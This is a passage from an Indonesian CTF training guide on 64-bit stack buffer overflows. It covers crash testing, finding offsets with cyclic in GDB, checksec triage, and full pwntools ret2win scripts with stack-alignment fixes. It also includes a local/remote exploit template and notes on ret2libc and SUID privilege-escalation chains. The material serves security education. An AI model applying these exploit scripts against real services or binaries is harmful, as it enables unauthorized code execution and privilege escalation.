Contoh:

```text
Run #1
0x7fffffffe1d0

Run #2
0x7fffffffe060

Run #3
0x7fffffffe1f0
```

Maka hardcoded:

```text
BUFFER_ADDR
```

tidak reliable.

Solusi umum:

```text
ASLR off
atau
information leak
atau
NOP sled / partial overwrite / other technique
```

---

# 🧠 BAGIAN 7 — FULL CTF WALKTHROUGH

# 7.1 🎯 Scenario — Easy Stack BOF

Target:

```text
./vuln
```

Karakteristik:

```text
64-bit
NX enabled
PIE disabled
Canary disabled
```

Binary juga memiliki:

```text
win()
```

Goal:

```text
ret2win
```

---

# STEP 1 — Initial Analysis

```bash
# Identify binary
file ./vuln

# Permission
ls -la ./vuln

# Security mitigations
checksec --file=./vuln
```

Contoh:

```text
./vuln:
ELF 64-bit LSB pie executable, x86-64,
dynamically linked,
not stripped
```

Checksec:

```text
RELRO           Partial RELRO
Stack Canary    No canary found
NX              NX enabled
PIE             No PIE
RPATH           No RPATH
RUNPATH         No RUNPATH
Symbols         No
```

Interpretasi:

```text
No Canary
   ↓
stack overwrite easier

NX ON
   ↓
prefer code reuse

PIE OFF
   ↓
binary code address predictable
```

---

# STEP 2 — Crash Test

```bash
# Send oversized input
python3 -c 'print("A"*200)' | ./vuln
```

Output:

```text
Welcome!
Input:
Segmentation fault
```

---

# STEP 3 — Find Offset

```bash
# Open GDB
gdb ./vuln
```

```gdb
# Intel syntax
set disassembly-flavor intel

# Run with cyclic pattern
run < <(python3 -c 'from pwn import *; sys.stdout.buffer.write(cyclic(200))')
```

Output:

```text
Program received signal SIGSEGV, Segmentation fault.
```

Check RIP:

```gdb
# Inspect RIP
info registers rip
```

Contoh:

```text
rip            0x6161616e
```

Cari offset:

```bash
# Find cyclic offset
python3 -c \
'from pwn import *; print(cyclic_find(0x6161616e))'
```

Output:

```text
72
```

Maka:

```text
OFFSET = 72
```

---

# STEP 4 — Identify `win()`

```bash
# Find win symbol
nm ./vuln | grep win
```

Output:

```text
0000000000401176 T win
```

Maka:

```text
WIN = 0x401176
```

---

# STEP 5 — Verify RIP Control

Create:

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./vuln", checksec=False)
context.binary = elf

OFFSET = 72

# Test control of RIP
payload = (
    b"A" * OFFSET +
    b"B" * 8
)

p = process(elf.path)

# Send payload
p.sendline(payload)

# Wait for crash
p.wait()
```

Run under GDB.

Expected:

```text
RIP = 0x4242424242424242
```

Now:

```text
RIP CONTROL CONFIRMED
```

---

# STEP 6 — Build ret2win

```python
#!/usr/bin/env python3

from pwn import *

# Parse ELF
elf = ELF("./vuln", checksec=False)

# Auto-detect architecture
context.binary = elf

# Log level
context.log_level = "info"

# Exact offset from cyclic
OFFSET = 72

# Get win() symbol
WIN = elf.sym["win"]

log.info(f"Offset = {OFFSET}")
log.info(f"win() = {hex(WIN)}")

# Build final payload
payload = flat(
    # Reach saved RIP
    b"A" * OFFSET,

    # Redirect execution to win()
    p64(WIN)
)

# Start local process
p = process(elf.path)

# Send exploit
p.sendline(payload)

# Interact
p.interactive()
```

---

# STEP 7 — Expected Output

```text
[*] '/home/user/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    Stripped: Yes
[*] Offset = 72
[*] win() = 0x401176
[*] Starting local process './vuln': pid 1234
[*] Switching to interactive mode
You win!
FLAG{simple_ret2win}
[*] Got EOF while reading in interactive
[*] Process './vuln' stopped with exit code -11 (SIGSEGV)
```

---

# STEP 8 — Jika `win()` Crash

Coba alignment gadget:

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./vuln", checksec=False)
context.binary = elf

OFFSET = 72
WIN = elf.sym["win"]

# Build ROP helper
rop = ROP(elf)

# Find ret gadget
RET = rop.find_gadget(["ret"])[0]

# Extra ret for alignment
payload = flat(
    b"A" * OFFSET,
    p64(RET),
    p64(WIN)
)

p = process(elf.path)
p.sendline(payload)
p.interactive()
```

---

# 🧯 BAGIAN 8 — COMMON ERRORS & TROUBLESHOOTING

|Error|Penyebab|Solusi|
|---|---|---|
|RIP tidak menjadi `0x42...`|Offset salah|Jalankan cyclic lagi|
|`cyclic_find` menghasilkan `-1`/`None`|Value bukan bagian pattern / endian salah|Ambil value dari stack dan cek width|
|RIP tidak menunjukkan pattern|Canonical address issue|Lihat `RSP`/stack|
|`Segmentation fault` sebelum RIP controlled|Input belum mencapai saved RIP|Tambah input / periksa offset|
|`SIGABRT`|Canary terdeteksi|Canary leak/bypass diperlukan|
|`SIGSEGV`|Invalid memory/instruction pointer|Inspect RIP/RSP|
|`SIGILL`|CPU mencoba execute invalid bytes|Address/architecture/payload salah|
|`cyclic` pattern terlalu pendek|RIP belum tertimpa|Tingkatkan pattern size|
|Offset berbeda di luar GDB|Environment berbeda|Samakan argv/env/input|
|Binary butuh newline|`scanf/fgets` behavior|Gunakan `sendline()`|
|`sendline()` merusak payload binary|Newline byte tidak diinginkan|Gunakan `send()`|
|`win()` address salah|PIE / wrong ELF|Gunakan symbol/runtime base|
|`win()` benar tapi crash|Stack alignment|Coba single `ret` gadget|
|`system()` crash|Alignment/libc/context|Check RSP + libc|
|`/bin/sh` tidak muncul|Address salah / wrong libc|Validasi libc|
|Gadget tidak ditemukan|Binary tidak mengandung gadget|Cari di libc / ret2csu / File 50|
|Exploit local bekerja, remote gagal|Libc/address berbeda|Leak + remote libc|
|PIE enabled tetapi address terlihat sama|Satu process/run saja|Test beberapa run|
|Canary enabled tapi RIP bisa diubah|Canary leak/bypass ada|Analyse chain|
|NX enabled tetapi shellcode gagal|Stack non-executable|Gunakan ret2libc/ROP|
|ASLR membuat buffer address berubah|Randomization aktif|Leak atau disable ASLR di lab|
|`No matching cyclic subsequence`|Wrong endian/width|Gunakan 4-byte value yang terlihat|
|Process exit sebelum output|Payload masuk tetapi program selesai|`recv`, `recvuntil`, timeout|
|GDB menunjukkan address berbeda|GDB environment|Bandingkan env/argv/load addresses|

---

# 8.1 🔥 SIGSEGV vs SIGABRT

## SIGSEGV

```text
SIGSEGV
```

biasanya:

```text
invalid memory access
invalid instruction address
```

Dalam BOF:

```text
RIP controlled
```

sering menghasilkan SIGSEGV.

---

## SIGABRT

```text
SIGABRT
```

sering:

```text
stack canary failure
```

Contoh:

```text
*** stack smashing detected ***
Aborted
```

Ini merupakan clue:

```text
Canary exists
```

---

# 8.2 📏 Offset Salah

Jika:

```text
OFFSET = 72
```

tetapi RIP tetap:

```text
0x401234
```

atau:

```text
0x41414141
```

maka:

```text
[ ] Offset benar?
[ ] Input parser mengubah input?
[ ] newline dibuang?
[ ] program menggunakan fgets?
[ ] ada integer parsing?
```

---

# 8.3 📐 MOVAPS Crash

Misalnya:

```text
Program received signal SIGSEGV
```

Backtrace:

```text
system()
 └── movaps
```

Coba:

```text
RIP
 ↓
ret
 ↓
target
```

satu extra `ret`.

---

# 8.4 🌪️ Local Works, Remote Fails

Ini salah satu error terbesar CTF.

Local:

```text
libc = 2.31
```

Remote:

```text
libc = 2.35
```

Maka:

```text
system address
"/bin/sh" address
gadgets
```

dapat berbeda.

Workflow:

```text
LOCAL
 ↓
offset
 ↓
control RIP
 ↓
identify primitive
 ↓
REMOTE
 ↓
leak
 ↓
calculate actual addresses
```

---

# 8.5 🧬 PIE Address Confusion

PIE enabled:

```text
main = 0x5555555551d6
```

Satu run:

```text
0x5555555551d6
```

Run berikut:

```text
0x5555555541d6
```

Itu normal jika ASLR aktif.

Jangan hardcode:

```text
0x5555555551d6
```

untuk remote.

---

# ⚡ BAGIAN 9 — QUICK REFERENCE CHEATSHEET

# 9.1 🔍 One-Liners

```bash
# Crash test
python3 -c 'print("A"*N)' | ./binary
```

```bash
# Generate cyclic pattern
python3 -c \
'from pwn import *; sys.stdout.buffer.write(cyclic(N))'
```

```bash
# Find offset
python3 -c \
'from pwn import *; print(cyclic_find(VALUE))'
```

```bash
# Verify RIP control
python3 -c \
'from pwn import *; sys.stdout.buffer.write(b"A"*OFFSET+b"B"*8)'
```

```bash
# Find win
nm ./binary | grep -E 'win|flag|shell'
```

```bash
# Find pop rdi
ROPgadget --binary ./binary | grep "pop rdi"
```

```bash
# Find ret
ROPgadget --binary ./binary | grep ": ret$"
```

```bash
# Show libraries
ldd ./binary
```

```bash
# Check mitigations
checksec --file=./binary
```

---

# 9.2 🐞 GDB Quick Commands

```gdb
# Intel syntax
set disassembly-flavor intel

# Start
run

# Run with argument
run AAAA

# Break main
break main

# Break function
break vulnerable

# Continue
continue

# Next
next

# Step
step

# Registers
info registers

# RIP only
info registers rip

# RSP only
info registers rsp

# Stack
x/20gx $rsp

# String
x/s ADDRESS

# Disassemble
disassemble main

# Backtrace
backtrace

# Mappings
info proc mappings
```

---

# 9.3 🐍 Pwntools BOF Template

```python
#!/usr/bin/env python3

from pwn import *

# ==========================================
# CONFIG
# ==========================================

BINARY = "./binary"

# Local test
LOCAL = True

# Remote target
HOST = "127.0.0.1"
PORT = 1337


# ==========================================
# ELF / CONTEXT
# ==========================================

# Parse ELF
elf = ELF(BINARY, checksec=False)

# Configure architecture automatically
context.binary = elf

# Logging
context.log_level = "info"


# ==========================================
# CONNECT
# ==========================================

if LOCAL:
    p = process(elf.path)
else:
    p = remote(HOST, PORT)


# ==========================================
# EXPLOIT
# ==========================================

# Replace with actual cyclic offset
OFFSET = 72

payload = flat(
    b"A" * OFFSET,

    # Add exploit values here
    # Example:
    # p64(elf.sym["win"])
)


# ==========================================
# SEND
# ==========================================

# If binary has a known prompt:
# p.sendlineafter(b"> ", payload)

# Generic:
p.sendline(payload)


# ==========================================
# INTERACTIVE
# ==========================================

p.interactive()
```

### ⚠️ Kenapa template ini “production-ready” untuk CTF?

Karena:

```text
[✓] ELF parsing
[✓] architecture detection
[✓] local/remote switch
[✓] logging
[✓] payload builder
[✓] interactive mode
```

Tetapi:

```text
OFFSET
payload
prompt
HOST
PORT
```

---

# 9.3.1 🐞 Debugging Exploit Script dengan GDB (`gdb.debug()` & `gdb.attach()`)

Sering kali pemula bertanya: *"Bagaimana cara melihat state register/memory di GDB saat exploit script Pwntools sedang berjalan?"*

### 1. Membuka Process Langsung di GDB (`gdb.debug`):
Ganti `p = process(elf.path)` dengan `gdb.debug()` untuk otomatis membuka terminal baru berisi GDB session.

```python
from pwn import *

elf = ELF("./binary", checksec=False)
context.binary = elf

# Launch process di bawah kendali GDB
# GDB window baru akan otomatis terbuka
p = gdb.debug(elf.path, gdbscript="""
    set disassembly-flavor intel
    break main
    break vulnerable_func
    continue
""")

OFFSET = 72
payload = flat(b"A" * OFFSET, b"B" * 8)
p.sendline(payload)
p.interactive()
```

### 2. Attach GDB ke Process yang Sudah Running (`gdb.attach`):

```python
from pwn import *

elf = ELF("./binary", checksec=False)
context.binary = elf

p = process(elf.path)

# Attach GDB ke PID process p
gdb.attach(p, gdbscript="""
    set disassembly-flavor intel
    break vulnerable_func
    continue
""")

# Kirim payload setelah GDB ter-attach
OFFSET = 72
payload = flat(b"A" * OFFSET, b"B" * 8)
p.sendline(payload)
p.interactive()
```

---

# 9.3.2 📩 Handling Prompt & Output Response Sebelum `interactive()`

Binary CTF sering kali tidak langsung menerima input, melainkan mencetak prompt awal atau output balasan.

```python
# ==========================================
# 1. HANDLE BINARY YANG PRINT PROMPT DULU
# ==========================================

p = process(elf.path)

# Terima data sampai string "Enter input: " muncul
p.recvuntil(b"Enter input: ")
p.sendline(payload)

# Atau jika prompt berupa karakter khusus seperti "> "
# p.sendlineafter(b"> ", payload)


# ==========================================
# 2. BACA DRAIN OUTPUT SEBELUM INPUT
# ==========================================

# Terima semua output awal (timeout 1 detik)
data = p.recv(timeout=1)
print("[+] Banner:", data.decode(errors="ignore"))
p.sendline(payload)


# ==========================================
# 3. BACA OUTPUT BALASAN SEBELUM INTERACTIVE
# ==========================================

p.sendline(payload)

# Ambil seluruh respon dari binary sebelum interactive mode
response = p.recvall(timeout=2)
print("[+] Server Response:", response.decode(errors="ignore"))

# Baru buka interactive() jika binary memberikan shell
p.interactive()
```

---

# 9.4 🏆 ret2win Template

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./binary", checksec=False)
context.binary = elf

OFFSET = 72
WIN = elf.sym["win"]

# Build payload
payload = flat(
    b"A" * OFFSET,
    p64(WIN)
)

# Launch
p = process(elf.path)

# Send
p.sendline(payload)

# Shell / output
p.interactive()
```

---

# 🌳 BAGIAN 10 — DECISION TREE BOF

```text
              [CRASH DENGAN INPUT PANJANG]
                           │
                           ▼
                  [ANALYZE DI GDB]
                           │
                           ▼
                 [RIP/EIP CONTROLLED?]
                           │
                  ┌────────┴────────┐
                  │                 │
                 NO                YES
                  │                 │
                  ▼                 ▼
             FILE 48 AGAIN      [CYCLIC]
                                    │
                                    ▼
                               [OFFSET]
                                    │
                                    ▼
                              [CHECKSEC]
                                    │
             ┌──────────────────────┼─────────────────────┐
             │                      │                     │
             ▼                      ▼                     ▼
        NX OFF                  NX ON                CANARY ON
             │                      │                     │
             ▼                      ▼                     ▼
         SHELLCODE              [WIN()?]            LEAK/BYPASS
                                  │
                         ┌────────┴─────────┐
                         │                  │
                        YES                 NO
                         │                  │
                         ▼                  ▼
                      RET2WIN           RET2LIBC
                         │                  │
                         ▼                  ▼
                  STACK ALIGN?        ASLR ON?
                         │                  │
                     ┌───┴───┐          ┌───┴───┐
                     │       │          │       │
                    YES      NO        NO      YES
                     │       │          │       │
                     ▼       ▼          ▼       ▼
                 extra ret   win      direct    LEAK
                                             │
                                             ▼
                                           FILE 50
```

---

# ⚡ 10.1 30-SECOND TRIAGE

```text
CRASH
 ↓
RIP CONTROL?
 ↓
CYCLIC
 ↓
OFFSET
 ↓
CHECKSEC
 ↓
NX?
 │
 ├── OFF → SHELLCODE
 │
 └── ON
      ↓
   win()?
      │
      ├── YES → RET2WIN
      │
      └── NO → RET2LIBC / ROP
```

---

# 🧠 BAGIAN 11 — MASTER MENTAL MODEL

Jangan menghafal:

```text
"Apa command ret2win?"
```

Hafalkan chain:

```text
INPUT
  ↓
OVERFLOW
  ↓
CONTROL DATA
  ↓
RIP/EIP
  ↓
OFFSET
  ↓
CHECKSEC
  ↓
CHOOSE STRATEGY
```

---

# 11.1 🔴 Primitive #1 — Memory Corruption

```text
buffer
 ↓
out-of-bounds write
 ↓
saved control data
```

---

# 11.2 🟠 Primitive #2 — Instruction Pointer Control

```text
saved RIP
 ↓
attacker-controlled address
```

---

# 11.3 🟡 Primitive #3 — Code Reuse

Jika:

```text
NX ON
```

gunakan:

```text
existing code
```

contohnya:

```text
win()
system()
libc
ROP gadgets
```

---

# 11.4 🟢 Primitive #4 — Code Injection

Jika:

```text
NX OFF
```

maka:

```text
shellcode
 ↓
execute
```

menjadi lebih mungkin.

---

# 🧬 BAGIAN 12 — 32-BIT vs 64-BIT SUMMARY

|Aspek|x86 32-bit|x86-64|
|---|---|---|
|Pointer|4 byte|8 byte|
|IP register|EIP|RIP|
|First argument|Stack|RDI|
|Second argument|Stack|RSI|
|Third argument|Stack|RDX|
|Common ret2libc|Simpler stack layout|Requires register control|
|Stack alignment|Lebih sederhana|16-byte ABI penting|
|`/bin/sh` passing|Stack|RDI|
|Typical packing|`p32()`|`p64()`|

### Muscle memory

```text
32-bit
 → p32

64-bit
 → p64
 → RDI
 → stack alignment
```

---

# 🔬 BAGIAN 13 — PATTERN RECOGNITION

```text
┌─────────────────────────────────────────────┐
│             BOF PATTERN                     │
├─────────────────────────────────────────────┤
│ crash + cyclic                              │
│       ↓                                     │
│ offset                                      │
├─────────────────────────────────────────────┤
│ RIP = 0x42424242                            │
│       ↓                                     │
│ RIP CONTROL                                 │
├─────────────────────────────────────────────┤
│ No Canary                                   │
│       ↓                                     │
│ overwrite easier                            │
├─────────────────────────────────────────────┤
│ NX disabled                                 │
│       ↓                                     │
│ shellcode candidate                         │
├─────────────────────────────────────────────┤
│ NX enabled + win()                          │
│       ↓                                     │
│ ret2win                                     │
├─────────────────────────────────────────────┤
│ NX enabled + no win()                       │
│       ↓                                     │
│ ret2libc / ROP                              │
├─────────────────────────────────────────────┤
│ PIE enabled + ASLR                          │
│       ↓                                     │
│ address leak needed                         │
├─────────────────────────────────────────────┤
│ Canary enabled                              │
│       ↓                                     │
│ canary leak/bypass                          │
└─────────────────────────────────────────────┘
```

---

# 🧯 BAGIAN 14 — DEBUGGING MINDSET

Saat exploit gagal, jangan langsung ubah sepuluh hal.

Gunakan:

```text
ONE VARIABLE AT A TIME
```

Contoh:

```text
Offset salah?
 ↓
perbaiki offset

RIP controlled?
 ↓
YA

WIN address benar?
 ↓
cek

Stack alignment?
 ↓
tambah ret

PIE?
 ↓
cek base

ASLR?
 ↓
cek leak
```

---

# 🧠 BAGIAN 15 — GOLDEN RULES

## Rule 01 — 🔎 Crash bukan akhir

```text
Crash
 ↓
Investigate
```

bukan:

```text
Crash
 ↓
exploit random
```

---

## Rule 02 — 🎯 Dapatkan exact offset

Gunakan:

```text
cyclic
```

bukan menebak:

```text
72
80
64
```

---

## Rule 03 — ✅ Buktikan RIP control

Gunakan:

```text
AAAA...
BBBBBBBB
```

Expected:

```text
0x4242424242424242
```

---

## Rule 04 — 🛡️ Baca checksec

Sebelum membuat exploit:

```text
Canary?
NX?
PIE?
RELRO?
```

---

## Rule 05 — 🧠 NX bukan "BOF tidak bisa"

NX hanya membuat:

```text
direct shellcode execution
```

lebih sulit.

Masih ada:

```text
ret2win
ret2libc
ROP
```

---

## Rule 06 — 📐 Stack alignment itu nyata

Jika:

```text
system()
```

crash tetapi:

```text
RIP
```

sudah benar:

```text
cek alignment
```

---

## Rule 07 — 🌪️ ASLR berarti address berubah

Jangan hardcode address jika:

```text
PIE / ASLR
```

aktif tanpa alasan.

---

## Rule 08 — 🔢 Endianness harus dipahami

x86:

```text
little endian
```

jadi:

```text
0x401176
```

disimpan sebagai:

```text
76 11 40 00 00 00 00 00
```

---

## Rule 09 — 📦 `p64()` untuk 64-bit

```python
p64(address)
```

bukan:

```python
p32(address)
```

---

## Rule 10 — 🧩 `send()` vs `sendline()`

Gunakan:

```python
p.send(payload)
```

untuk raw bytes.

Gunakan:

```python
p.sendline(payload)
```

jika program mengharapkan:

```text
newline
```

---

## Rule 11 — 🧪 Local dahulu

```text
LOCAL
 ↓
UNDERSTAND
 ↓
DEBUG
 ↓
REMOTE
```

---

## Rule 12 — 🔬 GDB adalah microscope

Pwntools:

```text
automation
```

GDB:

```text
understanding
```

Gunakan keduanya.

---

# 🏁 BAGIAN 16 — FINAL WORKFLOW

```text
                 [BINARY]
                     │
                     ▼
                [CHECKSEC]
                     │
                     ▼
                  [FUZZ]
                     │
                     ▼
                [CRASH?]
                     │
                    YES
                     │
                     ▼
                [GDB/PWNDBG]
                     │
                     ▼
              [RIP/EIP CONTROL?]
                     │
                    YES
                     │
                     ▼
                  [CYCLIC]
                     │
                     ▼
                  [OFFSET]
                     │
                     ▼
                [B CONTROL]
                     │
                     ▼
              [CHECKSEC AGAIN]
                     │
          ┌──────────┼───────────┐
          │          │           │
          ▼          ▼           ▼
        NX OFF     WIN()       NO WIN()
          │          │           │
          ▼          ▼           ▼
      SHELLCODE    RET2WIN     RET2LIBC
                                  │
                                  ▼
                               ASLR?
                              /     \
                            OFF      ON
                             │        │
                             ▼        ▼
                          DIRECT     LEAK
                                      │
                                      ▼
                                  ROP/FILE 50
```

---

# 🔗 BAGIAN 17 — CROSS-WORKFLOW

## ← File 48 — Binary Analysis

```text
./[🔬 48 — Binary Analysis Workflow](/docs/binary-analysis)
```

Trigger:

```text
File 48
   ↓
binary crash
   ↓
RIP/EIP controlled
   ↓
File 49
```

---

## ← File 47 — Sudo/SUID/Capabilities

```text
./[🐧 47 — Sudo, SUID & Capabilities Workflow](/docs/sudo-suid-capabilities)
```

Typical chain:

```text
SUID custom binary
       ↓
Binary Analysis
       ↓
Buffer Overflow
       ↓
Privilege Escalation
```

---

## → File 50 — ROP Chain

```text
./[🔗 50 — ROP Chain Workflow](/docs/rop-chain)
```

Trigger:

```text
BOF
 ↓
NX ON
 ↓
No easy win()
 ↓
ASLR/PIE
 ↓
Leak + ROP
```

---

## → File 51 — Reverse Engineering

```text
./[🧭 BAGIAN 0: FONDASI REVERSE ENGINEERING](/docs/reverse-engineering)
```

Gunakan jika:

```text
binary logic complex
+
vulnerability belum jelas
```

---

# ✅ BAGIAN 18 — FINAL CHECKLIST

```text
╔══════════════════════════════════════════════╗
║       BUFFER OVERFLOW MASTER CHECKLIST      ║
╚══════════════════════════════════════════════╝
```

## 🔍 Initial

```text
[ ] file
[ ] architecture
[ ] checksec
[ ] crash reproduced
[ ] GDB loaded
```

## 🎯 Control

```text
[ ] cyclic generated
[ ] crash with cyclic
[ ] RIP/EIP inspected
[ ] offset calculated
[ ] offset verified
[ ] B payload tested
[ ] RIP control confirmed
```

## 🛡️ Mitigations

```text
[ ] Canary
[ ] NX
[ ] PIE
[ ] RELRO
[ ] ASLR
```

## 🏆 ret2win

```text
[ ] win() found
[ ] win address verified
[ ] p64 used
[ ] payload tested
[ ] stack alignment checked
```

## 🧬 ret2libc

```text
[ ] libc identified
[ ] system located
[ ] /bin/sh located
[ ] pop rdi found
[ ] libc base known
[ ] ASLR considered
[ ] alignment checked
```

## 🐚 Shellcode

```text
[ ] NX disabled
[ ] shellcode generated
[ ] buffer address known
[ ] ASLR considered
[ ] RIP redirects to buffer
```

## 🌐 Remote

```text
[ ] remote host checked
[ ] remote port checked
[ ] libc version checked
[ ] local/remote addresses compared
[ ] leak implemented if necessary
```

---

# 🧠 BAGIAN 19 — THE ONE-LINE MEMORY

```text
CRASH → GDB → CYCLIC → OFFSET → RIP CONTROL → CHECKSEC → RET2WIN / RET2LIBC / SHELLCODE → VERIFY
```

---

# 🏆 BAGIAN 20 — THE REAL SKILL

Jangan berhenti pada:

```text
"Offset saya 72."
```

Yang harus dipahami:

```text
Mengapa 72?
```

Jawab:

```text
Buffer
 ↓
saved data
 ↓
saved RIP
 ↓
72 bytes
```

Jangan berhenti pada:

```text
"win = 0x401176"
```

Pahami:

```text
RIP
 ↓
0x401176
 ↓
CPU menjalankan win()
```

Jangan berhenti pada:

```text
"pop rdi"
```

Pahami:

```text
RDI
 ↓
argument pertama
 ↓
"/bin/sh"
```

Jangan berhenti pada:

```text
"ret gadget"
```

Pahami:

```text
ret
 ↓
mengambil address dari stack
 ↓
RSP berubah 8 byte
 ↓
alignment berubah
```

Dengan demikian:

```text
BUFFER OVERFLOW
```

tidak lagi menjadi:

```text
kumpulan command
```

melainkan:

```text
MEMORY CORRUPTION
      ↓
CONTROL DATA
      ↓
CONTROL FLOW
      ↓
CODE REUSE / CODE EXECUTION
```

---

# 🚀 MASTER CTF FLOW

```text
┌───────────────────────────────────────────────┐
│               STACK BOF MASTER FLOW           │
├───────────────────────────────────────────────┤
│                                               │
│   BINARY                                      │
│      ↓                                        │
│   CHECKSEC                                    │
│      ↓                                        │
│   FUZZ                                        │
│      ↓                                        │
│   CRASH                                       │
│      ↓                                        │
│   CYCLIC                                      │
│      ↓                                        │
│   OFFSET                                      │
│      ↓                                        │
│   RIP CONTROL                                 │
│      ↓                                        │
│   CHECK MITIGATIONS                            │
│      ↓                                        │
│  ┌────────────┬─────────────┬──────────────┐  │
│  │            │             │              │  │
│  ▼            ▼             ▼              │  │
│ NX OFF      WIN()         NO WIN()          │  │
│  │            │             │              │  │
│  ▼            ▼             ▼              │  │
│ SHELLCODE   RET2WIN      RET2LIBC/ROP      │  │
│                                             │  │
└─────────────────────────────────────────────┘
```

---

# [💥 49 — Buffer Overflow Workflow](/docs/buffer-overflow) — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.
> 
> **Prerequisites:** File [🔬 48 — Binary Analysis Workflow](/docs/binary-analysis) sudah selesai — binary sudah diidentifikasi, crash sudah direproduksi, dan ada indikasi input dapat mengontrol control data.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun
export BINARY="./vuln"
export TARGET_HOST=""    # Isi jika remote CTF
export TARGET_PORT=""    # Isi jika remote CTF
mkdir -p ~/bof_work/{payloads,dumps,scripts}
cd ~/bof_work

# Verifikasi tools tersedia
python3 -c "from pwn import *; print('[OK] pwntools')"
gdb --version | head -1
checksec --version 2>/dev/null || echo "checksec via pip"
ROPgadget --version 2>/dev/null || echo "install: pip3 install ROPgadget"
```

**Output yang diharapkan:**

text

```
[OK] pwntools
GNU gdb (Debian ...) x.x
```

**OUTPUT GAGAL ❌ — pwntools tidak ada:**

text

```
ModuleNotFoundError: No module named 'pwn'
```

➡️ Install dulu:

Bash

```
pip3 install pwntools
pip3 install ROPgadget
git clone https://github.com/pwndbg/pwndbg.git && cd pwndbg && ./setup.sh
```

---

## ═══════════════════════════════════════

## FASE 0: ANALISIS AWAL BINARY

## ═══════════════════════════════════════

### Langkah 0.1 — Identifikasi Binary

Bash

```
# Command 1: Tipe file dan arsitektur
file $BINARY

# Command 2: Permission dan ownership (penting untuk SUID!)
ls -la $BINARY

# Command 3: Library dependencies
ldd $BINARY

# Command 4: Symbols yang tersedia
nm $BINARY 2>/dev/null | grep -E 'win|flag|shell|admin|system|gets|scanf|strcpy|read'
```

**OUTPUT BERHASIL ✅ — 64-bit binary:**

text

```
./vuln: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
```

**OUTPUT BERHASIL ✅ — 32-bit binary:**

text

```
./vuln: ELF 32-bit LSB executable, Intel 80386, dynamically linked, not stripped
```

> **📌 CATAT:** 64-bit = gunakan `p64()` dan register RIP/RDI. 32-bit = gunakan `p32()` dan EIP/stack args.

**OUTPUT BERHASIL ✅ — Ada symbol menarik:**

text

```
0000000000401176 T win
0000000000401050 T gets@plt       ← fungsi vulnerable!
```

➡️ Ada `win()` → catat addressnya, nanti dipakai di Fase 4A (ret2win)

**OUTPUT ✅ — ldd output:**

text

```
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f...)
```

➡️ Catat path libc yang digunakan → penting untuk ret2libc

---

### Langkah 0.2 — Checksec: Decision Matrix Utama

Bash

```
# Command 1: Checksec lengkap
checksec --file=$BINARY

# Command 2: Alternatif via pwntools
python3 -c "from pwn import *; e = ELF('$BINARY'); print(e.checksec())"
```

**OUTPUT BERHASIL ✅ — Contoh output:**

text

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    Stripped: No
```

**Cara baca checksec — DECISION MATRIX:**

|Canary|NX|PIE|Strategy|
|---|---|---|---|
|No|No|No|ret2win / shellcode — paling mudah|
|No|Yes|No|ret2win (jika ada) atau ret2libc/ROP|
|No|Yes|Yes|Butuh leak address → ROP/ret2libc|
|Yes|*|*|Butuh canary leak dulu → lihat Fase 7|
|No|No|Yes|Shellcode mungkin, tapi butuh leak address|

> **📌 SIMPAN INFO INI:**
> 
> Bash
> 
> ```
> # Set variabel berdasarkan hasil checksec
> export ARCH="amd64"    # atau i386
> export HAS_CANARY="no"
> export HAS_NX="yes"
> export HAS_PIE="no"
> ```

---

### Langkah 0.3 — Identifikasi Vektor Input

Bash

```
# Jalankan binary tanpa input — amati behavior
./$BINARY

# Coba kirim input
echo "AAAA" | ./$BINARY
echo "" | ./$BINARY

# Coba input via argumen
./$BINARY "AAAA"
./$BINARY AAAA
```

**OUTPUT BERHASIL ✅ — Binary menunggu input (stdin):**

text

```
Enter your name: 
```

➡️ Input via stdin → gunakan `p.sendline(payload)` di pwntools

**OUTPUT BERHASIL ✅ — Binary langsung exit:**

text

```
Usage: ./vuln <input>
```

➡️ Input via argv[1] → gunakan `process([elf.path, payload])`

**OUTPUT BERHASIL ✅ — Binary menunggu lalu mencetak:**

text

```
Enter your name: 
Hello, AAAA!
```

➡️ Ada prompt → nanti gunakan `p.sendlineafter(b"name: ", payload)`

**OUTPUT GAGAL ❌ — Binary minta file:**

text

```
./vuln: missing file argument
```

➡️ Input via file → `python3 -c '...' > input.bin && ./vuln input.bin`

---

## ═══════════════════════════════════════

## FASE 1: KONFIRMASI CRASH (FUZZ)

## ═══════════════════════════════════════

### Langkah 1.1 — Crash Test Awal

Bash

```
# Command 1: Kirim 200 byte A (awal yang aman)
python3 -c 'print("A"*200)' | ./$BINARY

# Command 2: Jika tidak crash, naikkan
python3 -c 'print("A"*500)' | ./$BINARY

# Command 3: Binary safe dengan raw bytes
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*200)' | ./$BINARY
```

**OUTPUT BERHASIL ✅ — Crash terdeteksi:**

text

```
Segmentation fault (core dumped)
```

➡️ Binary vulnerable! Lanjut ke Langkah 1.2

**OUTPUT BERHASIL ✅ — Stack smashing:**

text

```
*** stack smashing detected ***
Aborted (core dumped)
```

➡️ Ada canary! Tapi masih overflow. Catat: butuh canary bypass. Lanjut ke Langkah 1.2 tapi track ke Fase 7.

**OUTPUT GAGAL ❌ — Tidak ada crash dengan 200/500 byte:**

text

```
Hello, AAAAAA...!
```

➡️ Coba lebih besar:

Bash

```
python3 -c 'print("A"*1000)' | ./$BINARY
python3 -c 'print("A"*2000)' | ./$BINARY
# Atau cek source/Ghidra untuk ukuran buffer yang sebenarnya
```

**OUTPUT GAGAL ❌ — Input di-truncate:**

text

```
# Binary hanya menerima beberapa karakter lalu berhenti
```

➡️ Mungkin menggunakan `fgets` dengan limit. Cek di Ghidra:

Bash

```
# Buka Ghidra, cari fungsi vulnerable
# Atau gunakan ltrace
ltrace ./$BINARY <<< "$(python3 -c 'print("A"*200)')"
# Cari: fgets(buffer, SIZE, stdin) → SIZE adalah limit
```

---

